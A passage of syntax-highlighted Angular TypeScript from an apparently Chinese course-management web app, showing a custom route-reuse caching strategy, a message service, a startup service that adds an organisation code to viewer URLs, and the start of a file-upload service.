  componentRef<span class="token operator">:</span> ComponentRef<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">export</span> <span class="token keyword">interface</span> <span class="token class-name">RouteCacheRecord</span> <span class="token punctuation">{</span>
  handle<span class="token operator">:</span> DetachedRouteHandleExt<span class="token punctuation">;</span>
  <span class="token comment">/**
   * For unclear reasons, when the navigation starts, &quot;retrieve&quot; is called
   * without calling &quot;shouldAttach&quot; first (from &quot;createRouterState&quot;).
   * This flag is used to ignore those calls. :-
   */</span>
  shouldAttachCalled<span class="token operator">:</span> boolean<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AtrReuseStrategy</span> <span class="token keyword">implements</span> <span class="token class-name">RouteReuseStrategy</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> <span class="token keyword">static</span> routeCache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token operator">&lt;</span>string<span class="token punctuation">,</span> RouteCacheRecord<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> ReusePath<span class="token operator">:</span> string<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'_m_course-manage_course-list'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_course-manage_profession-list'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_course-manage_i-initiated'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_course-manage_approve-all'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_rm_read'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_rm_case'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_rm_setting'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_rm_train'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_course-manage_scp-list'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_course-manage_initiatepkg'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_course-manage_iapproved'</span><span class="token punctuation">,</span>
    <span class="token string">'_m_course-manage_series-management'</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token comment">/** 删除所有缓存路由 */</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">deleteAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> routeCache <span class="token operator">=</span> AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>routeCache <span class="token operator">&amp;&amp;</span> routeCache<span class="token punctuation">.</span>handle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        routeCache<span class="token punctuation">.</span>handle<span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token comment">/** 删除缓存路由快照的方法 */</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token function">deleteRouteSnapshot</span><span class="token punctuation">(</span>path<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> key <span class="token operator">=</span> <span class="token function">encodeURI</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\//g</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> routeCache <span class="token operator">=</span> AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>routeCache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>routeCache <span class="token operator">&amp;&amp;</span> routeCache<span class="token punctuation">.</span>handle<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        routeCache<span class="token punctuation">.</span>handle<span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token function">shouldDetach</span><span class="token punctuation">(</span>route<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span>
    <span class="token keyword">const</span> key <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSnapshotKey</span><span class="token punctuation">(</span>route<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> del <span class="token operator">=</span> AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> shouldDetach <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isToBeIgnored</span><span class="token punctuation">(</span>route<span class="token punctuation">,</span> <span class="token string">'shouldDetach'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>del<span class="token punctuation">;</span>
    <span class="token keyword">return</span> shouldDetach<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token comment">/** 当路由离开时会触发。按path作为key存储路由快照&amp;组件当前实例对象 */</span>
  <span class="token function">store</span><span class="token punctuation">(</span>route<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">,</span> detachedTree<span class="token operator">:</span> DetachedRouteHandleExt <span class="token operator">|</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>detachedTree <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isToBeIgnored</span><span class="token punctuation">(</span>route<span class="token punctuation">,</span> <span class="token string">'store'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">const</span> key <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSnapshotKey</span><span class="token punctuation">(</span>route<span class="token punctuation">)</span><span class="token punctuation">;</span>
    AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      handle<span class="token operator">:</span> detachedTree<span class="token punctuation">,</span>
      shouldAttachCalled<span class="token operator">:</span> <span class="token boolean">false</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>detachedTree<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">callHook</span><span class="token punctuation">(</span>detachedTree<span class="token punctuation">,</span> <span class="token string">'ngOnDetach'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
 <span class="token comment">/** 若 path 在缓存中有的都认为允许还原路由 */</span>
  <span class="token function">shouldAttach</span><span class="token punctuation">(</span>route<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span>
    <span class="token keyword">const</span> key <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSnapshotKey</span><span class="token punctuation">(</span>route<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> stored <span class="token operator">=</span> AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> destroyed <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>
      stored <span class="token operator">&amp;&amp;</span> stored<span class="token punctuation">.</span>handle<span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span>hostView<span class="token punctuation">.</span>destroyed
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> msgStatus <span class="token operator">=</span> destroyed <span class="token operator">?</span> <span class="token string">'DESTROYED'</span> <span class="token operator">:</span> stored <span class="token operator">?</span> <span class="token string">'FOUND'</span> <span class="token operator">:</span> <span class="token string">'NOT FOUND'</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> shouldAttach <span class="token operator">=</span>
      <span class="token operator">!</span>destroyed <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token operator">!</span>stored <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isToBeIgnored</span><span class="token punctuation">(</span>route<span class="token punctuation">,</span> <span class="token string">'shouldAttach'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shouldAttach<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      stored<span class="token punctuation">.</span>shouldAttachCalled <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> shouldAttach<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
 <span class="token comment">/** 从缓存中获取快照，若无则返回nul */</span>
  <span class="token function">retrieve</span><span class="token punctuation">(</span>route<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">)</span><span class="token operator">:</span> DetachedRouteHandleExt <span class="token operator">|</span> <span class="token keyword">null</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> key <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getSnapshotKey</span><span class="token punctuation">(</span>route<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> stored <span class="token operator">=</span> AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> destroyed <span class="token operator">=</span> <span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>
      stored <span class="token operator">&amp;&amp;</span> stored<span class="token punctuation">.</span>handle<span class="token punctuation">.</span>componentRef<span class="token punctuation">.</span>hostView<span class="token punctuation">.</span>destroyed
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> shouldBeRetrieved <span class="token operator">=</span>
      <span class="token operator">!</span>destroyed <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token operator">!</span>stored <span class="token operator">&amp;&amp;</span> stored<span class="token punctuation">.</span>shouldAttachCalled<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>destroyed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      AtrReuseStrategy<span class="token punctuation">.</span>routeCache<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shouldBeRetrieved<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      stored<span class="token punctuation">.</span>shouldAttachCalled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isToBeIgnored</span><span class="token punctuation">(</span>route<span class="token punctuation">,</span> <span class="token string">'retrieve'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">const</span> detachedTree <span class="token operator">=</span> stored<span class="token punctuation">.</span>handle<span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">callHook</span><span class="token punctuation">(</span>detachedTree<span class="token punctuation">,</span> <span class="token string">'ngOnAttach'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> detachedTree<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isToBeIgnored</span><span class="token punctuation">(</span>route<span class="token punctuation">,</span> <span class="token string">'pre-retrieve'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> stored <span class="token operator">?</span> stored<span class="token punctuation">.</span>handle <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
 <span class="token comment">/** 进入路由触发，判断是否同一路由 */</span>
  <span class="token function">shouldReuseRoute</span><span class="token punctuation">(</span>future<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">,</span> curr<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">)</span><span class="token operator">:</span> boolean <span class="token punctuation">{</span>
    <span class="token keyword">const</span> result <span class="token operator">=</span> future<span class="token punctuation">.</span>routeConfig <span class="token operator">===</span> curr<span class="token punctuation">.</span>routeConfig<span class="token punctuation">;</span> <span class="token comment">// from DefaultRouteReuseStrategy</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
 <span class="token comment">/** 使用route的path作为快照的key */</span>
  <span class="token keyword">private</span> <span class="token function">getSnapshotKey</span><span class="token punctuation">(</span>snapshot<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">)</span><span class="token operator">:</span> string <span class="token punctuation">{</span>
    <span class="token keyword">return</span> snapshot<span class="token punctuation">[</span><span class="token string">'_routerState'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\//g</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token comment">/**过滤相关不重用路由*/</span>
  <span class="token keyword">private</span> <span class="token function">isToBeIgnored</span><span class="token punctuation">(</span><span class="token parameter">route<span class="token operator">:</span> ActivatedRouteSnapshot<span class="token punctuation">,</span> msg<span class="token operator">:</span> string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>route<span class="token punctuation">.</span>routeConfig<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>route<span class="token punctuation">.</span>routeConfig<span class="token punctuation">.</span>loadChildren<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>route<span class="token punctuation">.</span>children<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>AtrReuseStrategy<span class="token punctuation">.</span>ReusePath<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token function">encodeURI</span><span class="token punctuation">(</span>route<span class="token punctuation">[</span><span class="token string">'_routerState'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/\//g</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token comment">/**增加attach/dettach钩子*/</span>
  <span class="token keyword">private</span> <span class="token function">callHook</span><span class="token punctuation">(</span>detachedTree<span class="token operator">:</span> DetachedRouteHandleExt<span class="token punctuation">,</span> hookName<span class="token operator">:</span> string<span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> componentRef <span class="token operator">=</span> detachedTree<span class="token punctuation">.</span>componentRef<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
      componentRef <span class="token operator">&amp;&amp;</span>
      componentRef<span class="token punctuation">.</span>instance <span class="token operator">&amp;&amp;</span>
      <span class="token keyword">typeof</span> componentRef<span class="token punctuation">.</span>instance<span class="token punctuation">[</span>hookName<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'function'</span>
    <span class="token punctuation">)</span> <span class="token punctuation">{</span>
      componentRef<span class="token punctuation">.</span>instance<span class="token punctuation">[</span>hookName<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// message.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>BehaviorSubject<span class="token punctuation">,</span> Observable<span class="token punctuation">,</span> Subject<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> ServicesModule
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">MessageService</span> <span class="token punctuation">{</span>
  <span class="token keyword">private</span> subject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BehaviorSubject</span><span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">clearMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Observable<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>subject<span class="token punctuation">.</span><span class="token function">asObservable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// startup.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ToolsUtil <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../utils/tools.util'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> environment <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'src/environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
<span class="token comment">/**
 * 用于应用启动时
 * 一般用来获取应用所需要的基础数据等
 */</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> <span class="token string">'root'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">StartupService</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Promise<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> orgCode <span class="token operator">=</span> ToolsUtil<span class="token punctuation">.</span><span class="token function">getOrgCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>orgCode<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> ow365Arr <span class="token operator">=</span> environment<span class="token punctuation">.</span>ow365<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        environment<span class="token punctuation">.</span>ow365 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ow365Arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?orgCode=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>orgCode<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>ow365Arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
        environment<span class="token punctuation">.</span>commonViewer <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>environment<span class="token punctuation">.</span>commonViewer<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?orgCode=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>orgCode<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// upload-oss.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpService <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./http.service'</span><span class="token punctuation">;</span>
<span class="token comment">// import { UploadFile, UploadXHRArgs } from 'ng-zorro-antd';</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ToolsUtil <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../utils/tools.util'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> HttpRequest<span class="token punctuation">,</span> HttpClient<span class="token punctuation">,</span> HttpEvent<span class="token punctuation">,</span> HttpResponse<span class="token punctuation">,</span> HttpEventType <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> environment <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'src/environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> ServicesModule
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">UploadOssService</span> <span class="token punctuation">{</span>
  uploadData<span class="token operator">:</span> any<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> httpService<span class="token operator">:</span> HttpService<span class="token punctuation">,</span> <span class="token keyword">private</span> httpClient<span class="token operator">:</span> HttpClient</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token function-variable function">uploadOss</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">file<span class="token punctuation">,</span> uploadDir</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Observable</span><span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token parameter">observe</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> <span class="token function-variable function">success</span> <span class="token operator">=</span> <span class="token parameter">result</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>uploadData <span class="token operator">=</span> result<span class="token punctuation">.</span>data<span class="token punctuation">;</span>
